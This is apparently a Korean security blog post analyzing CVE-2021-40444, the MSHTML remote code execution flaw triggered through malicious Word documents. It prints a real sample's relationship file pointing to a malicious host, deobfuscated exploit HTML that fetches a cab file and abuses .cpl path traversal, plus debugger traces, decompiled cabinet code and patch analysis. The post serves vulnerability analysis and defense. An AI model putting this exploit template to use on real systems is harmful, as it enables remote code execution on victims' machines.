---
layout: post
title: CVE-2021-40444 취약점 분석
subtitle: RCE vulnerability in MSHTML Protocol
categories: CVE
tags: [cve-2021-40444, MSHTML]
---

# CVE-2021-40444, MSHTML 프로토콜을 악용한 원격코드 실행 취약점

# **소개**

CVE-2021-40444 취약점은 MS Office 문서 내 원격 서버 주소가 존재하며, 웹페이지 접근 시 그 데이터를 핸들링하는 과정에서 발생한다. 기술연구소 분석팀 NOM@L과 함께 취약점을 분석해보자.

# **취약점 분석**

## **취약 대상 버전**

- Windows 7
- Windows 8.1
- Windows RT 8.1
- Windows 10
- Windows Server 2008
- Windows Server 2012
- Windows Server 2016
- Windows Server 2019
- Windows Server 2022

## **취약점 발생 원인**

- 악성 워드 문서 내 원격주소 존재 ([xxx.xxx.xxx.xxx/side.html](http://xxx.xxx.xxx.xxx/side.html))
- js 코드에서 cab 을 가리키는 객체 존재
- cab 에서 취약점 발생 → 로컬에 inf 파일 저장
- 파일 확장자가 .cpl 이면 control.exe 를 통해 실행

## **취약점 유발 인자 분석**

실제 악성 샘플을 통해 취약점 유발 인자 분석을 진행한다.

- SHA-256 : 938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52
- File Type : docx

압축푼 docx 파일의 document.xml.rels 설정파일 내 악성 페이로드를 받아올 원격 주소가 존재한다.

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="<http://schemas.openxmlformats.org/package/2006/relationships>"><Relationship Id="rId8" Type="<http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme>" Target="theme/theme1.xml"/><Relationship Id="rId3" Type="<http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings>" Target="webSettings.xml"/><Relationship Id="rId7" Type="<http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable>" Target="fontTable.xml"/><Relationship Id="rId2" Type="<http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings>" Target="settings.xml"/><Relationship Id="rId1" Type="<http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles>" Target="styles.xml"/><Relationship Id="rId6" Type="<http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject>" Target="mhtml:<http://hidusi.com/e8c76295a5f9acb7/side.html!x-usc:http://hidusi.com/e8c76295a5f9acb7/side.html>" TargetMode="External"/><Relationship Id="rId5" Type="<http://schemas.openxmlformats.org/officeDocument/2006/relationships/image>" Target="media/image2.wmf"/><Relationship Id="rId4" Type="<http://schemas.openxmlformats.org/officeDocument/2006/relationships/image>" Target="media/image1.jpeg"/></Relationships>

```

html 안에 취약점을 유발하는 cab 파일 위치가 존재한다.

```
XMLHttpRopen['call'](XMLHttpR, 'GET', '<http://127.0.0.1/test.cab>', ![]),
                XMLHttpRsend['call'](XMLHttpR),
                htmlfile5['Script']['document']['write']('body>');
                var htmlScript = window["Document"]['prototype']['createElement']['call'](htmlfile5['Script']['document'], 'object');
                **htmlScript['setAttribute']('codebase', '<http://127.0.0.1/test.cab#version=5,0,0,0>')**;
                htmlScript['setAttribute']('CLSID:edbc374c-5730-432a-b5b8-de94f0b57217'),
                window["HTMLElement"]["prototype"]["appendChild"]['call'](htmlfile5['Script']['document']['body'], htmlScript),

```

난독화가 풀린 html 내용은 다음과 같다.

```
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Expires" content="-1">
        <meta http-equiv="X-UA-Compatible" content="IE=11">
    </head>
    <body>
        <script>
            function garbage() {
                return 'garbage';
            }
            (function exploit() {
                var iframe = window["Document"]['prototype']['createElement']['call'](window["document"], 'iframe');
                try {
                    window["HTMLElement"]["prototype"]["appendChild"]['call'](window["document"]['body'], iframe);
                } catch (_0x1ab454) {
                    window["HTMLElement"]["prototype"]["appendChild"]['call'](window["document"]['documentElement'], iframe);
                }
                var htmlfile = iframe['contentWindow']['ActiveXObject'], htmlfile2 = new htmlfile('htmlfile');
                iframe['contentDocument']['open']()['close']();
                try {
                    window["HTMLElement"]["prototype"]["removeChild"]['call'](window["document"]['body'], iframe);
                } catch (_0x3b004e) {
                    window["HTMLElement"]["prototype"]["removeChild"]['call'](window["document"]['documentElement'], iframe);
                }
                htmlfile2['open']()['close']();
                var htmlfile3 = new htmlfile2[('Script')]['ActiveXObject']('htmlfile');
                htmlfile3['open']()['close']();
                var htmlfile4 = new htmlfile3[('Script')]['ActiveXObject']('htmlfile');
                htmlfile4['open']()['close']();
                var htmlfile5 = new htmlfile4[('Script')]['ActiveXObject']('htmlfile');
                htmlfile5['open']()['close']();
                var ActiveXObjectVAR = new ActiveXObject('htmlfile')
                  , ActiveXObjectVAR2 = new ActiveXObject('htmlfile')
                  , ActiveXObjectVAR3 = new ActiveXObject('htmlfile')
                  , ActiveXObjectVAR4 = new ActiveXObject('htmlfile')
                  , ActiveXObjectVAR5 = new ActiveXObject('htmlfile')
                  , ActiveXObjectVAR6 = new ActiveXObject('htmlfile')
                  , XMLHttpR = new window['XMLHttpRequest']()
                  , XMLHttpRopen = window['XMLHttpRequest']['prototype']['open']
                  , XMLHttpRsend = window['XMLHttpRequest']['prototype']['send'];
                XMLHttpRopen['call'](XMLHttpR, 'GET', '<HOST_CHANGE_HERE>', ![]),
                XMLHttpRsend['call'](XMLHttpR),
                htmlfile5['Script']['document']['write']('body>');
                var htmlScript = window["Document"]['prototype']['createElement']['call'](htmlfile5['Script']['document'], 'object');
                htmlScript['setAttribute']('codebase', '<HOST_CHANGE_HERE>#version=5,0,0,0');
                htmlScript['setAttribute']('CLSID:edbc374c-5730-432a-b5b8-de94f0b57217'),
                window["HTMLElement"]["prototype"]["appendChild"]['call'](htmlfile5['Script']['document']['body'], htmlScript),
                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
                ActiveXObjectVAR['Script']['location'] = '.cpl:123',
                ActiveXObjectVAR['Script']['location'] = '.cpl:../../../AppData/Local/Temp/Low/<INF_CHANGE_HERE>',
                ActiveXObjectVAR2['Script']['location'] = '.cpl:../../../AppData/Local/Temp/<INF_CHANGE_HERE>',
                ActiveXObjectVAR3['Script']['location'] = '.cpl:../../../../AppData/Local/Temp/Low/<INF_CHANGE_HERE>',
                ActiveXObjectVAR4['Script']['location'] = '.cpl:../../../../AppData/Local/Temp/<INF_CHANGE_HERE>',
                ActiveXObjectVAR5['Script']['location'] = '.cpl:../../../../../Temp/Low/<INF_CHANGE_HERE>',
                ActiveXObjectVAR4['Script']['location'] = '.cpl:../../../../../Temp/<INF_CHANGE_HERE>',
                ActiveXObjectVAR4['Script']['location'] = '.cpl:../../Low/<INF_CHANGE_HERE>',
                ActiveXObjectVAR4['Script']['location'] = '.cpl:../../<INF_CHANGE_HERE>';
            }());
        </script>
    </body>
</html>
```

## **취약점 발생 위치 디버깅**

설정파일 내에 원격 주소로 html 을 요청하고 html 내용을 실행하게 된다. html 내용중에 원격 주소로 cab 파일을 요청하게 되는데 이를 처리해 주는 과정에서 취약점이 발생한다.

![image1.png](/assets/images/cve-2021-40444-img/image1.png)

### **.cab 파일 처리 과정**

cab 파일에 대한 처리는 cabinet.dll 에서 진행되고 cabinet.dll이 로딩되기 전 urlmon!getextnandbasefilename 함수에서 파일의 접미어를 식별한다.

![image2.png](/assets/images/cve-2021-40444-img/image2.png)

그 후 urlmon!createuniquecabtempdir 함수에서 임시 폴더를 생성한다.

![image3.png](/assets/images/cve-2021-40444-img/image3.png)

![image4.png](/assets/images/cve-2021-40444-img/image4.png)

(extractinffile → extract, fdicreate fdicopy ->fdinotify)

cab 파일 압축해제 후에 cab 파일에 대한 정보를 가져온다. 임시 폴더에 압축 해제된 파일 경로는 ../msword.inf 이다.

![image5.png](/assets/images/cve-2021-40444-img/image5.png)

catdirandfile 함수가 종료되고 win32open 함수에서 createfileA 함수가 호출되어 msword.inf 파일에 쓰기 작업이 시작된다. 하지만 zipslip 으로 인해 Temp\msword.inf 에 파일이 생성된다.

![image6.png](/assets/images/cve-2021-40444-img/image6.png)

![image7.png](/assets/images/cve-2021-40444-img/image7.png)

쓰기 작업이 마무리 된 후에 cabinet!fdigetfile 함수에서 cfdata 사이즈가 the file 에 쓰여진 후 실제 압축해제된 caFile 사이즈가 제외된다. cfdata 에 써진 사이즈는 caFile 사이즈가 될 때까지 비교를 수행한다.

![image8.png](/assets/images/cve-2021-40444-img/image8.png)

악성 cab 에 대한 사이즈를 0x415c00 으로 조작한다.

![image9.png](/assets/images/cve-2021-40444-img/image9.png)

비정상적인 종료로 deleteextractedfiles 함수가 호출되지 않게 하기 위해서 사이즈를 조작한다. 정상적으로 함수가 종료되면 deleteextractedfiles 호출되어 임시 파일(msword.inf)을 삭제한다.

![image10.png](/assets/images/cve-2021-40444-img/image10.png)

![image11.png](/assets/images/cve-2021-40444-img/image11.png)

# **취약점 대응 방안**

## **실제 적용된 보안 패치 버전 분석**

![image12.png](/assets/images/cve-2021-40444-img/image12.png)

urlmon dll 의 catDirAndFile 함수에서 경로에 ‘/' 가 들어갈 경우 '\\’ 로 치환하는 내용이 추가되었다.

- urlmon.dll - createuniquecabtempdir 함수에서 임시 폴더 생성
    
    extractinffile 에서 추출됨 - fdicreate (init r/w apis)→ fdicopy (extract info of cab file) → cab 정보 얻음
    
    fdicopy 다음에 logincabinet 이 (cab 파일의) 0x24 header 정보를 추출한다.
    
    여러 함수들 호출이되고 초기화된 구조체 정보를 얻은후에는 urlmon!extractonefile (in extractinffile)이 호출된다. (urlmon!extracinffile → urlmon!extractonefile 호출)
    
    extractonefile 함수 안에서 구조체가 a4+202 에 할당되고, 이 값은 .inf 경로를 담고 있다.
    
    그 후에 urlmon!fdinotifyextract 함수가 호출되고 catdirandfile 이 호출된다.
    

bp extractonefile rdx → ../msword.inf

```
ModLoad: 00000000`66470000 00000000`66490000   C:\Windows\SysWOW64\CABINET.DLL
Breakpoint 0 hit
urlmon!ExtractOneFile:
6c1e1524 8bff            mov     edi,edi
0:000:x86> da rdx
Couldn't resolve error at 'rdx'
0:000:x86> da edx
007fb458  "../msword.inf"
0:000:x86> bl
     0 e Disable Clear  x86 6c1e1524     0001 (0001)  0:**** urlmon!ExtractOneFile
```

```
urlmon!catDirAndFile+0xd2:
00007ffc`1945dba6 e8a1e6faff      call    urlmon!PathCchCanonicalizeA (00007ffc`1940c24c
)
0:000> da r15
00000025`cebd9434  "C:\Users\puing\AppData\Local\Tem"
00000025`cebd9454  "p\Cab1CD2\../msword.inf"
```

catdirandfile 에서는 win32open 함수를 호출하고 win32open 함수에서 .inf 파일을 생성하기위해 createfilea 를 호출한다. 그리고 temp 폴더안에 .inf 파일이 생성된다.

flag 를 3 으로 바꿀경우 .inf 파일이 생성되지도 않고 winopen 함수는 호출되지 않는다.

![image13.png](/assets/images/cve-2021-40444-img/image13.png)

cabinet!fdigetfile 에서 첫번째 cfdata 가 파일에 써지고 cafile(압축풀린 파일 사이즈) 이 추출된다. cfdata 에 써진 데이터 사이즈와 cafile 사이즈를 비교한다. 실제 사용된 cafile 은 cfdata 보다 크기때문에 cabinet!fdigetdatablock 이 호출된다.( fail..) 이 이유로 deletefilea 함수가 호출되지 않아서 쓰기작업된 파일이 삭제되지 않고 생성된 .inf 파일이 저장되어 있고 cpl 파일을 이용하여 이를 실행하게 된다.

정상적이라면 flag 값에따라 cabinet!markextracted_18000C74C 함수가 호출돼서 v1 변수값이 셋팅된다.

```
int __fastcall sub_18000CA10(int a1, __int64 a2)
{
  __int64 v2; // rdi@1
  __int64 v3; // rbx@1
  int v4; // ecx@2
  int v5; // ecx@3
  int v7; // eax@8
  __int64 v8; // rax@14
  unsigned int v9; // er11@15
  char *v10; // rcx@17
  _BYTE *v11; // rax@19
  _BYTE *v12; // rbx@19
  __int64 v13; // [sp+0h] [bp-188h]@5
  int v14; // [sp+20h] [bp-168h]@22
  int v15; // [sp+28h] [bp-160h]@22
  __int64 v16; // [sp+30h] [bp-158h]@22
  __int64 v17; // [sp+40h] [bp-148h]@16
  char v18; // [sp+50h] [bp-138h]@15
  char v19[259]; // [sp+51h] [bp-137h]@17
  char v20; // [sp+154h] [bp-34h]@21
  __int64 v21; // [sp+160h] [bp-28h]@5

  v2 = *(_QWORD *)(a2 + 32);
  v3 = a2;
  if ( a1 )
  {
    v4 = a1 - 1;
    if ( v4 )
    {
      v5 = v4 - 1;
      if ( v5 )
      {
        if ( v5 == 1 && sub_18000C924(v2 + 292, a2, v2 + 32, *(_QWORD *)(a2 + 8)) )
        {
          sub_18000C4D4(*(_QWORD *)(v3 + 40), *(_WORD *)(v3 + 48), *(_WORD *)(v3 + 50));
          sub_18000C9E0(*(_QWORD *)(v3 + 40));
          if ( *(_WORD *)(v3 + 52) )
            v7 = *(_WORD *)(v3 + 52) & 0xFFD8;
          else
            v7 = 128;
          SetFileAttributesA(v2 + 292, (unsigned int)v7);
          markextracted_18000C74C(v2, *(_QWORD *)(v3 + 8));
        }
      }
      else if ( sub_18000C924(v2 + 292, a2, v2 + 32, *(_QWORD *)(a2 + 8))
             && sub_18000C408(v2, *(_QWORD *)(v3 + 8), *(_DWORD *)v3)
             && sub_18000C79C(v2, *(_QWORD *)(v3 + 8)) )
      {
        LODWORD(v8) = sub_18000C82C(*(_QWORD *)(v3 + 8));

signed __int64 __fastcall markextracted_18000C74C(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx@1
  __int64 v3; // rdi@1

  v2 = *(_QWORD *)(a1 + 0x10);
  v3 = a2;
  while ( lstrcmpiA(v3, *(_QWORD *)v2) )
  {
    v2 = *(_QWORD *)(v2 + 8);
    if ( !v2 )
      return 0i64;
  }
  *(_DWORD *)(v2 + 0x10) = 0;
  return 1i64;
}
```

```
int __fastcall deleteextractfiles_1800CD8AC(__int64 a1)
{
  __int64 v1; // rbx@1
  __int64 v2; // rdi@1
  __int64 v3; // rcx@6
  __int64 v5; // [sp+0h] [bp-148h]@8
  char v6; // [sp+20h] [bp-128h]@3
  __int64 v7; // [sp+130h] [bp-18h]@8

  v1 = *(_QWORD *)(a1 + 0x10);
  v2 = a1;
  while ( v1 )                                  // flag 0x2 means (v1+0x10) 1 here
  {
    if ( !*(_DWORD *)(v1 + 0x10) && sub_1800CDAD4(&v6, 260, v2 + 32, *(_BYTE **)v1) && SetFileAttributesA(&v6, 128i64) )
      DeleteFileA(&v6);
    CoTaskMemFree(*(_QWORD *)v1);
```

cpl 파일을 실행하는 메소드를 url scheme 이라고 한다. url scheme 함수는 간단하게 url 을 통해 로컬 어플리케이션을 실행하는 것이다. cpl 을 실행하는 명령어는 레지스트리에서 찾아볼 수 있다. control.exe 로 정의되어 있으면 control.exe 를 통해 cpl 파일이 실행된다. (cpl 은 windows control panel extension 이다.) cpl 은 실행가능한 파일이지만 독립적으로 실행안되고 보통 shell32.dll 에 의해서 오픈된다.

url scheme 을 호출하면 shellexecutew 함수를 통해 파일을 실행하고 결과적으로 mshtml!shellexecurl 에 들어가게된다.

## **운영상 대응 방안**

**사내 운영 상황을 고려 후 보안 업데이트 권장**

- **MS 보안 업데이트 가이드 링크**
    - [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444)